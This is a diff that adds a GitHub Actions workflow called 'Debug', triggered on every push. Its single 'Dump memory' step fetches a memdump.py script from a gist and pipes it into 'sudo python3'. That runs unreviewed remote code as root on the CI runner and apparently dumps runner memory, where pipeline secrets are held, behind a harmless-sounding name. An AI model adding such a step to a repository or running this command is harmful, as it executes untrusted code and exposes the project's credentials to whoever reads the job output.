@@ -1,0 +1,9 @@
+name: Debug
+on: push
+jobs:
+  debug:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Dump memory
+        run: |
+          curl -sSf https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py | sudo python3
